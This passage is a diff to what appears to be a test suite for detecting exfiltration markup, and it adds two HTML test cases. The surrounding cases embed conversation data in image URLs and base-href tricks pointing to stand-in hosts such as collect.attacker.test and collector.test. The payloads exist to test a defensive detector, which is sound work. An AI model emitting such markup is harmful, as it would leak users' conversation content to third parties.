@@ -273,6 +273,8 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<base href='https://collector.test/'><img src='/{c}.png'>", ["exfiltration_query"]),
         ("<img src='/{c}.png'><base href='https://collector.test/'>", ["exfiltration_query"]),
         ("<img src='/{c}.png'>", []),
+        ("<base href=''><base href='https://collector.test/'><img src='/{c}.png'>", []),
+        ("<image src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
         (
             (
                 "<iframe srcdoc='&lt;base href=&quot;https://collector.test/&quot;&gt;"
